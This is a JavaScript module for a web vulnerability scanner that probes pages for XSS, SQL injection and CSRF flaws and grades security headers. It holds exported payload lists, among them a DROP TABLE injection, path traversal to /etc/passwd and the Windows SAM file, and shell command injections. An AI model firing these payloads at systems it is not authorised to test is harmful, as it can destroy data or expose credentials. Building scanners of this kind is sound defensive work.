"use strict";
/**
 * ═══════════════════════════════════════════════════════════════════════════════
 * MIND-ENGINE: SECURITY TESTING
 * ═══════════════════════════════════════════════════════════════════════════════
 *
 * XSS, CSRF, SQL Injection detection, security scanner, penetration testing
 *
 * @author dp | QAntum Labs
 * @version 1.0.0-QANTUM-PRIME
 * @license Commercial
 * ═══════════════════════════════════════════════════════════════════════════════
 */
Object.defineProperty(exports, "__esModule", { value: true });
exports.SecurityScanner = exports.CSRFScanner = exports.SecurityHeadersAnalyzer = exports.SQLInjectionScanner = exports.XSSScanner = void 0;
exports.createSecurityScanner = createSecurityScanner;
const events_1 = require("events");
// ═══════════════════════════════════════════════════════════════════════════════
// XSS PAYLOADS
// ═══════════════════════════════════════════════════════════════════════════════
const XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    "'-alert('XSS')-'",
    '<body onload=alert("XSS")>',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<input onfocus=alert("XSS") autofocus>',
    '<marquee onstart=alert("XSS")>',
    '<video><source onerror="alert(\'XSS\')">',
    '{{constructor.constructor("alert(1)")()}}',
    '${alert("XSS")}',
    '<math><mtext><table><mglyph><style><img src=x onerror=alert("XSS")>',
    '<a href="javascript:alert(\'XSS\')">click</a>',
    '<div style="background:url(javascript:alert(\'XSS\'))">',
    'data:text/html,<script>alert("XSS")</script>',
    '<object data="javascript:alert(\'XSS\')">',
    '<embed src="javascript:alert(\'XSS\')">',
    '<form action="javascript:alert(\'XSS\')"><input type=submit>',
    '<button onclick="alert(\'XSS\')">click</button>'
];
// ═══════════════════════════════════════════════════════════════════════════════
// SQL INJECTION PAYLOADS
// ═══════════════════════════════════════════════════════════════════════════════
const SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "1' OR '1'='1",
    "1 OR 1=1",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1'; DROP TABLE users--",
    "1; SELECT * FROM users",
    "admin'--",
    "admin' #",
    "' OR 1=1#",
    "' OR EXISTS(SELECT * FROM users)--",
    "1' AND '1'='1",
    "1' AND SLEEP(5)--",
    "1' WAITFOR DELAY '0:0:5'--",
    "1' AND (SELECT COUNT(*) FROM users) > 0--",
    "' HAVING 1=1--",
    "' GROUP BY columnname HAVING 1=1--"
];
// ═══════════════════════════════════════════════════════════════════════════════
// PATH TRAVERSAL PAYLOADS
// ═══════════════════════════════════════════════════════════════════════════════
const PATH_TRAVERSAL_PAYLOADS = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',
    '..%252f..%252f..%252fetc/passwd',
    '/etc/passwd%00',
    '..%c0%af..%c0%af..%c0%afetc/passwd',
    '....//....//....//windows/win.ini',
    '%252e%252e%252f%252e%252e%252f',
    '..%5c..%5c..%5cwindows%5cwin.ini'
];
// ═══════════════════════════════════════════════════════════════════════════════
// COMMAND INJECTION PAYLOADS
// ═══════════════════════════════════════════════════════════════════════════════
const COMMAND_INJECTION_PAYLOADS = [
    '; ls -la',
    '| ls -la',
    '`ls -la`',
    '$(ls -la)',
    '; cat /etc/passwd',
    '| cat /etc/passwd',
    '& whoami',
    '&& whoami',
    '|| whoami',
    '; ping -c 5 127.0.0.1',
    '| ping -c 5 127.0.0.1',
    '; sleep 5',
    '| sleep 5',
    '`sleep 5`',
    '$(sleep 5)'
];
// ═══════════════════════════════════════════════════════════════════════════════
// XSS SCANNER
// ═══════════════════════════════════════════════════════════════════════════════
class XSSScanner extends events_1.EventEmitter {
    page;
    vulnerabilities = [];
    constructor(page) {
        super();
        this.page = page;
    }
    /**
     * Scan page for XSS vulnerabilities
     */
    // Complexity: O(N*M) — nested iteration
    async scan(url) {
        this.vulnerabilities = [];
        // SAFETY: async operation — wrap in try-catch for production resilience
        await this.page.goto(url);
        // Find all input fields
        // SAFETY: async operation — wrap in try-catch for production resilience
        const inputs = await this.page.locator('input, textarea, [contenteditable="true"]').all();
        // SAFETY: async operation — wrap in try-catch for production resilience
        const forms = await this.page.locator('form').all();
        // Test each input
        for (const input of inputs) {
            // SAFETY: async operation — wrap in try-catch for production resilience
            await this.testInput(input, url);
        }
        // Test URL parameters
        // SAFETY: async operation — wrap in try-catch for production resilience
        await this.testURLParameters(url);
        // Test forms
        for (const form of forms) {
            // SAFETY: async operation — wrap in try-catch for production resilience
            await this.testForm(form, url);
        }
        return this.vulnerabilities;
    }
    // Complexity: O(N) — loop
    async testInput(input, url) {
        // SAFETY: async operation — wrap in try-catch for production resilience
        const inputName = await input.getAttribute('name') || await input.getAttribute('id') || 'unknown';
        for (const payload of XSS_PAYLOADS.slice(0, 5)) {
            try {
                await input.fill('');
                await input.fill(payload);
                // Check if payload is reflected
                const pageContent = await this.page.content();
                if (this.detectXSSInContent(pageContent, payload)) {
                    this.addVulnerability({
                        type: 'xss',
                        severity: 'high',
                        title: `Reflected XSS in input field: ${inputName}`,
                        description: `The input field "${inputName}" is vulnerable to Cross-Site Scripting (XSS) attacks.`,
                        url,
                        parameter: inputName,
                        payload,
                        evidence: `Payload was reflected in page content`,
                        remediation: 'Implement proper input validation and output encoding. Use Content-Security-Policy headers.',
                        cwe: 'CWE-79',
                        owasp: 'A7:2017-Cross-Site Scripting (XSS)'
                    });
                    break;
                }
            }
            catch {
                // Input might not be fillable
            }
        }
    }
    // Complexity: O(N*M) — nested iteration
    async testURLParameters(url) {
        const urlObj = new URL(url);
        const params = urlObj.searchParams;
        for (const [key] of params) {
            for (const payload of XSS_PAYLOADS.slice(0, 3)) {
                const testUrl = new URL(url);
                testUrl.searchParams.set(key, payload);
                try {
                    await this.page.goto(testUrl.toString());
                    const content = await this.page.content();
                    if (this.detectXSSInContent(content, payload)) {
                        this.addVulnerability({
                            type: 'xss',
                            severity: 'high',
                            title: `Reflected XSS in URL parameter: ${key}`,
                            description: `The URL parameter "${key}" is vulnerable to XSS.`,
                            url: testUrl.toString(),
                            parameter: key,
                            payload,
                            evidence: 'Payload reflected in response',
                            remediation: 'Sanitize and encode URL parameters before rendering.',
                            cwe: 'CWE-79',
                            owasp: 'A7:2017-Cross-Site Scripting (XSS)'
                        });
                        break;
                    }
                }
                catch {
                    // URL might be invalid
                }
            }
        }
    }
    // Complexity: O(N*M) — nested iteration
    async testForm(form, url) {
        // SAFETY: async operation — wrap in try-catch for production resilience
        const action = await form.getAttribute('action');
        // SAFETY: async operation — wrap in try-catch for production resilience
        const method = await form.getAttribute('method') || 'GET';
        // SAFETY: async operation — wrap in try-catch for production resilience
        const inputs = await form.locator('input, textarea').all();
        for (const input of inputs) {
            // SAFETY: async operation — wrap in try-catch for production resilience
            const name = await input.getAttribute('name');
            if (!name)
                continue;
            for (const payload of XSS_PAYLOADS.slice(0, 3)) {
                try {
                    await input.fill(payload);
                }
                catch {
                    // Skip non-fillable inputs
                }
            }
        }
        // Submit form and check
        try {
            await form.locator('button[type="submit"], input[type="submit"]').first().click();
            await this.page.waitForLoadState('networkidle');
            const content = await this.page.content();
            for (const payload of XSS_PAYLOADS.slice(0, 3)) {
                if (this.detectXSSInContent(content, payload)) {
                    this.addVulnerability({
                        type: 'xss',
                        severity: 'high',
                        title: `Stored/Reflected XSS via form submission`,
                        description: `Form with action "${action}" is vulnerable to XSS.`,
                        url,
                        payload,
                        evidence: 'Payload executed after form submission',
                        remediation: 'Validate and sanitize all form inputs.',
                        cwe: 'CWE-79',
                        owasp: 'A7:2017-Cross-Site Scripting (XSS)'
                    });
                    break;
                }
            }
        }
        catch {
            // Form might not be submittable
        }
    }
    // Complexity: O(N*M) — nested iteration
    detectXSSInContent(content, payload) {
        // Check for unencoded payload
        if (content.includes(payload))
            return true;
        // Check for script execution indicators
        const scriptPatterns = [
            /<script[^>]*>.*alert.*<\/script>/i,
            /onerror\s*=\s*["']?alert/i,
            /onload\s*=\s*["']?alert/i,
            /javascript:\s*alert/i
        ];
        return scriptPatterns.some(pattern => pattern.test(content));
    }
    // Complexity: O(1)
    addVulnerability(vuln) {
        this.vulnerabilities.push({
            ...vuln,
            id: `xss-${Date.now()}-${Math.random().toString(36).slice(2)}`,
            timestamp: new Date()
        });
        this.emit('vulnerability', this.vulnerabilities[this.vulnerabilities.length - 1]);
    }
}
exports.XSSScanner = XSSScanner;
// ═══════════════════════════════════════════════════════════════════════════════
// SQL INJECTION SCANNER
// ═══════════════════════════════════════════════════════════════════════════════
class SQLInjectionScanner extends events_1.EventEmitter {
    page;
    vulnerabilities = [];
    constructor(page) {
        super();
        this.page = page;
    }
    /**
     * Scan for SQL Injection vulnerabilities
     */
    // Complexity: O(1)
    async scan(url) {
        this.vulnerabilities = [];
        // Test URL parameters
        // SAFETY: async operation — wrap in try-catch for production resilience
        await this.testURLParameters(url);
        // Test form inputs
        // SAFETY: async operation — wrap in try-catch for production resilience
        await this.page.goto(url);
        // SAFETY: async operation — wrap in try-catch for production resilience
        await this.testForms();
        return this.vulnerabilities;
    }
    // Complexity: O(N*M) — nested iteration
    async testURLParameters(url) {
        const urlObj = new URL(url);
        const params = urlObj.searchParams;
        for (const [key] of params) {
            for (const payload of SQLI_PAYLOADS) {
                const testUrl = new URL(url);
                testUrl.searchParams.set(key, payload);
                try {
                    const startTime = Date.now();
                    const response = await this.page.goto(testUrl.toString());
                    const duration = Date.now() - startTime;
                    const content = await this.page.content();
                    // Check for SQL error messages
                    if (this.detectSQLError(content)) {
                        this.addVulnerability({
                            type: 'sqli',
                            severity: 'critical',
                            title: `SQL Injection in parameter: ${key}`,
                            description: `The parameter "${key}" is vulnerable to SQL Injection.`,
                            url: testUrl.toString(),
                            parameter: key,
                            payload,
                            evidence: 'SQL error message detected in response',
                            remediation: 'Use parameterized queries or prepared statements.',
                            cwe: 'CWE-89',
                            owasp: 'A1:2017-Injection'
                        });
                        break;
                    }
                    // Check for time-based blind injection
                    if (payload.includes('SLEEP') || payload.includes('WAITFOR')) {
                        if (duration > 5000) {
                            this.addVulnerability({
                                type: 'sqli',
                                severity: 'critical',
                                title: `Time-based Blind SQL Injection in: ${key}`,
                                description: `Time-based blind SQL injection detected in "${key}".`,
                                url: testUrl.toString(),
                                parameter: key,
                                payload,
                                evidence: `Response delayed by ${duration}ms`,
                                remediation: 'Use parameterized queries.',
                                cwe: 'CWE-89',
                                owasp: 'A1:2017-Injection'
                            });
                            break;
                        }
                    }
                }
                catch {
                    // Request might fail
                }
            }
        }
    }
    // Complexity: O(N*M) — nested iteration
    async testForms() {
        // SAFETY: async operation — wrap in try-catch for production resilience
        const forms = await this.page.locator('form').all();
        for (const form of forms) {
            // SAFETY: async operation — wrap in try-catch for production resilience
            const inputs = await form.locator('input[type="text"], input[type="search"], input[type="email"], input:not([type])').all();
            for (const input of inputs) {
                // SAFETY: async operation — wrap in try-catch for production resilience
                const name = await input.getAttribute('name');
                if (!name)
                    continue;
                for (const payload of SQLI_PAYLOADS.slice(0, 5)) {
                    try {
                        await input.fill(payload);
                        await form.locator('button[type="submit"], input[type="submit"]').first().click();
                        const content = await this.page.content();
                        if (this.detectSQLError(content)) {
                            this.addVulnerability({
                                type: 'sqli',
                                severity: 'critical',
                                title: `SQL Injection in form input: ${name}`,
                                description: `Form input "${name}" is vulnerable to SQL Injection.`,
                                url: this.page.url(),
                                parameter: name,
                                payload,
                                evidence: 'SQL error in response',
                                remediation: 'Use parameterized queries.',
                                cwe: 'CWE-89',
                                owasp: 'A1:2017-Injection'
                            });
                            break;
                        }
                        // SAFETY: async operation — wrap in try-catch for production resilience
                        await this.page.goBack();
                    }
                    catch {
                        // Form might not work
                    }
                }
            }
        }
    }
    // Complexity: O(1)
    detectSQLError(content) {
        const errorPatterns = [
            /SQL syntax.*MySQL/i,
            /Warning.*mysql_/i,
            /MySqlException/i,
            /valid MySQL result/i,
            /PostgreSQL.*ERROR/i,
            /Warning.*pg_/i,
            /ORA-\d{5}/i,
            /Oracle error/i,
            /SQLite.*error/i,
            /Microsoft.*ODBC.*SQL Server/i,
            /Unclosed quotation mark/i,
            /SQLSTATE\[/i,
            /syntax error at or near/i,
            /quoted string not properly terminated/i,
            /You have an error in your SQL syntax/i
        ];
        return errorPatterns.some(pattern => pattern.test(content));
    }
    // Complexity: O(1)
    addVulnerability(vuln) {
        this.vulnerabilities.push({
            ...vuln,
            id: `sqli-${Date.now()}-${Math.random().toString(36).slice(2)}`,
            timestamp: new Date()
        });
        this.emit('vulnerability', this.vulnerabilities[this.vulnerabilities.length - 1]);
    }
}
exports.SQLInjectionScanner = SQLInjectionScanner;
// ═══════════════════════════════════════════════════════════════════════════════
// SECURITY HEADERS ANALYZER
// ═══════════════════════════════════════════════════════════════════════════════
class SecurityHeadersAnalyzer {
    requiredHeaders = {
        'Content-Security-Policy': {
            description: 'Prevents XSS and injection attacks',
            severity: 'high'
        },
        'X-Content-Type-Options': {
            description: 'Prevents MIME-type sniffing',
            severity: 'medium'
        },
        'X-Frame-Options': {
            description: 'Prevents clickjacking attacks',
            severity: 'medium'
        },
        'Strict-Transport-Security': {
            description: 'Enforces HTTPS connections',
            severity: 'high'
        },
        'X-XSS-Protection': {
            description: 'Legacy XSS protection',
            severity: 'low'
        },
        'Referrer-Policy': {
            description: 'Controls referrer information',
            severity: 'low'
        },
        'Permissions-Policy': {
            description: 'Controls browser features',
            severity: 'low'
        }
    };
    /**
     * Analyze security headers
     */
    // Complexity: O(N) — linear scan
    async analyze(url) {
        // SAFETY: async operation — wrap in try-catch for production resilience
        const response = await fetch(url);
        const headers = {};
        response.headers.forEach((value, key) => {
            headers[key.toLowerCase()] = value;
        });
        const missingHeaders = [];
        const presentHeaders = [];
        for (const [header, info] of Object.entries(this.requiredHeaders)) {
            const headerLower = header.toLowerCase();
            if (!headers[headerLower]) {
                missingHeaders.push({
                    header,
                    severity: info.severity,
                    description: info.description,
                    recommendation: `Add ${header} header to your responses`
                });
            }
            else {
                const analysis = this.analyzeHeader(header, headers[headerLower]);
                presentHeaders.push(analysis);
            }
        }
        const score = this.calculateScore(missingHeaders, presentHeaders);
        return {
            url,
            headers,
            missingHeaders,
            presentHeaders,
            score,
            grade: this.calculateGrade(score)
        };
    }
    // Complexity: O(1)
    analyzeHeader(header, value) {
        const notes = [];
        let isSecure = true;
        switch (header) {
            case 'Content-Security-Policy':
                if (value.includes("'unsafe-inline'")) {
                    notes.push("Warning: 'unsafe-inline' allows inline scripts");
                    isSecure = false;
                }
                if (value.includes("'unsafe-eval'")) {
                    notes.push("Warning: 'unsafe-eval' allows eval()");
                    isSecure = false;
                }
                break;
            case 'Strict-Transport-Security':
                if (!value.includes('max-age')) {
                    notes.push('Missing max-age directive');
                    isSecure = false;
                }
                if (!value.includes('includeSubDomains')) {
                    notes.push('Consider adding includeSubDomains');
                }
                break;
            case 'X-Frame-Options':
                if (value.toUpperCase() === 'ALLOW-FROM') {
                    notes.push('ALLOW-FROM is deprecated');
                }
                break;
        }
        return { header, value, isSecure, notes };
    }
    // Complexity: O(N) — linear scan
    calculateScore(missing, present) {
        const totalHeaders = Object.keys(this.requiredHeaders).length;
        const presentSecure = present.filter(h => h.isSecure).length;
        return Math.round((presentSecure / totalHeaders) * 100);
    }
    // Complexity: O(1)
    calculateGrade(score) {
        if (score >= 90)
            return 'A';
        if (score >= 80)
            return 'B';
        if (score >= 70)
            return 'C';
        if (score >= 60)
            return 'D';
        return 'F';
    }
}
exports.SecurityHeadersAnalyzer = SecurityHeadersAnalyzer;
// ═══════════════════════════════════════════════════════════════════════════════
// CSRF SCANNER
// ═══════════════════════════════════════════════════════════════════════════════
class CSRFScanner extends events_1.EventEmitter {
    page;
    vulnerabilities = [];
    constructor(page) {
        super();
        this.page = page;
    }
    /**
     * Scan for CSRF vulnerabilities
     */
    // Complexity: O(N*M) — nested iteration
    async scan(url) {
        this.vulnerabilities = [];
        // SAFETY: async operation — wrap in try-catch for production resilience
        await this.page.goto(url);
        // SAFETY: async operation — wrap in try-catch for production resilience
        const forms = await this.page.locator('form').all();
        for (const form of forms) {
            // SAFETY: async operation — wrap in try-catch for production resilience
            const method = await form.getAttribute('method');
            // Only check POST/PUT/DELETE forms
            if (!method || method.toUpperCase() === 'GET')
                continue;
            // SAFETY: async operation — wrap in try-catch for production resilience
            const hasCSRFToken = await this.checkForCSRFToken(form);
            // SAFETY: async operation — wrap in try-catch for production resilience
            const hasSameSiteCookie = await this.checkSameSiteCookie();
            if (!hasCSRFToken && !hasSameSiteCookie) {
                // SAFETY: async operation — wrap in try-catch for production resilience
                const action = await form.getAttribute('action') || url;
                this.addVulnerability({
                    type: 'csrf',
                    severity: 'high',
                    title: 'Missing CSRF Protection',
                    description: `Form with action "${action}" lacks CSRF token protection.`,
                    url,
                    evidence: 'No CSRF token found in form',
                    remediation: 'Implement CSRF tokens for all state-changing operations.',
                    cwe: 'CWE-352',
                    owasp: 'A8:2013-Cross-Site Request Forgery (CSRF)'
                });
            }
        }
        return this.vulnerabilities;
    }
    // Complexity: O(N) — loop
    async checkForCSRFToken(form) {
        const csrfPatterns = [
            'csrf',
            '_token',
            'authenticity_token',
            'anti-forgery',
            '__RequestVerificationToken',
            'X-CSRF-TOKEN',
            'XSRF-TOKEN'
        ];
        for (const pattern of csrfPatterns) {
            // SAFETY: async operation — wrap in try-catch for production resilience
            const token = await form.locator(`input[name*="${pattern}" i], input[id*="${pattern}" i]`).count();
            if (token > 0)
                return true;
        }
        return false;
    }
    // Complexity: O(1)
    async checkSameSiteCookie() {
        // SAFETY: async operation — wrap in try-catch for production resilience
        const cookies = await this.page.context().cookies();
        return cookies.some((cookie) => cookie.sameSite === 'Strict' || cookie.sameSite === 'Lax');
    }
    // Complexity: O(1)
    addVulnerability(vuln) {
        this.vulnerabilities.push({
            ...vuln,
            id: `csrf-${Date.now()}-${Math.random().toString(36).slice(2)}`,
            timestamp: new Date()
        });
        this.emit('vulnerability', this.vulnerabilities[this.vulnerabilities.length - 1]);
    }
}
exports.CSRFScanner = CSRFScanner;
// ═══════════════════════════════════════════════════════════════════════════════
// SECURITY SCANNER (MAIN)
// ═══════════════════════════════════════════════════════════════════════════════
class SecurityScanner extends events_1.EventEmitter {
    config;
    page;
    vulnerabilities = [];
    constructor(page, config) {
        super();
        this.page = page;
        this.config = {
            maxDepth: 3,
            maxPages: 50,
            timeout: 30000,
            scanTypes: ['xss', 'sqli', 'csrf'],
            ...config
        };
    }
    /**
     * Run full security scan
     */
    // Complexity: O(1)
    async scan() {
        const startTime = new Date();
        this.vulnerabilities = [];
        const scannedUrls = new Set();
        this.emit('start', { url: this.config.url });
        // Scan main URL
        // SAFETY: async operation — wrap in try-catch for production resilience
        await this.scanUrl(this.config.url, scannedUrls, 0);
        const endTime = new Date();
        const report = {
            scanId: `scan-${Date.now()}`,
            startTime,
            endTime,
            duration: endTime.getTime() - startTime.getTime(),
            target: this.config.url,
            pagesScanned: scannedUrls.size,
            vulnerabilities: this.vulnerabilities,
            summary: this.calculateSummary(),
            score: this.calculateScore()
        };
        this.emit('complete', report);
        return report;
    }
    // Complexity: O(N) — loop
    async scanUrl(url, scanned, depth) {
        if (scanned.has(url))
            return;
        if (scanned.size >= this.config.maxPages)
            return;
        if (depth > this.config.maxDepth)
            return;
        scanned.add(url);
        this.emit('scanning', { url, depth });
        try {
            await this.page.goto(url, { timeout: this.config.timeout });
            // Run configured scanners
            if (this.config.scanTypes?.includes('xss')) {
                const xssScanner = new XSSScanner(this.page);
                const xssVulns = await xssScanner.scan(url);
                this.vulnerabilities.push(...xssVulns);
            }
            if (this.config.scanTypes?.includes('sqli')) {
                const sqlScanner = new SQLInjectionScanner(this.page);
                const sqlVulns = await sqlScanner.scan(url);
                this.vulnerabilities.push(...sqlVulns);
            }
            if (this.config.scanTypes?.includes('csrf')) {
                const csrfScanner = new CSRFScanner(this.page);
                // SAFETY: async operation — wrap in try-catch for production resilience
                const csrfVulns = await csrfScanner.scan(url);
                this.vulnerabilities.push(...csrfVulns);
            }
            // Crawl links
            // SAFETY: async operation — wrap in try-catch for production resilience
            const links = await this.page.locator('a[href]').all();
            for (const link of links) {
                // SAFETY: async operation — wrap in try-catch for production resilience
                const href = await link.getAttribute('href');
                if (!href)
                    continue;
                try {
                    const absoluteUrl = new URL(href, url).toString();
                    if (this.shouldCrawl(absoluteUrl)) {
                        await this.scanUrl(absoluteUrl, scanned, depth + 1);
                    }
                }
                catch {
                    // Invalid URL
                }
            }
        }
        catch (error) {
            this.emit('error', { url, error: error.message });
        }
    }
    // Complexity: O(N) — loop
    shouldCrawl(url) {
        const baseOrigin = new URL(this.config.url).origin;
        const urlOrigin = new URL(url).origin;
        if (urlOrigin !== baseOrigin)
            return false;
        if (this.config.excludePatterns) {
            for (const pattern of this.config.excludePatterns) {
                if (new RegExp(pattern).test(url))
                    return false;
            }
        }
        return true;
    }
    // Complexity: O(N) — loop
    calculateSummary() {
        const summary = { critical: 0, high: 0, medium: 0, low: 0, info: 0, total: 0 };
        for (const vuln of this.vulnerabilities) {
            summary[vuln.severity]++;
            summary.total++;
        }
        return summary;
    }
    // Complexity: O(N) — loop
    calculateScore() {
        const weights = { critical: 25, high: 15, medium: 8, low: 3, info: 1 };
        let deductions = 0;
        for (const vuln of this.vulnerabilities) {
            deductions += weights[vuln.severity];
        }
        return Math.max(0, 100 - deductions);
    }
}
exports.SecurityScanner = SecurityScanner;
// ═══════════════════════════════════════════════════════════════════════════════
// EXPORTS
// ═══════════════════════════════════════════════════════════════════════════════
function createSecurityScanner(page, config) {
    return new SecurityScanner(page, config);
}
exports.default = {
    SecurityScanner,
    XSSScanner,
    SQLInjectionScanner,
    CSRFScanner,
    SecurityHeadersAnalyzer,
    XSS_PAYLOADS,
    SQLI_PAYLOADS,
    PATH_TRAVERSAL_PAYLOADS,
    COMMAND_INJECTION_PAYLOADS,
    createSecurityScanner
};
